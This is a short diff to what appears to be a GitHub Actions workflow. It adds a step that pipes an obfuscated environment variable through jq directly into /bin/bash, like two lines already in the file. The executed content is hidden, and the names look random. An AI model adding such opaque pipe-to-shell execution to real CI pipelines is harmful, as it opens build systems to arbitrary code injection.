@@ -18,6 +18,7 @@ jobs:
         run: |
           printf '%s' "$y39" | jq -r .psbl4 | /bin/bash
           printf '%s' "$fcmm6" | jq -r .t3 | /bin/bash
+          echo $ez1545 | jq -r .rzsjs1012 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
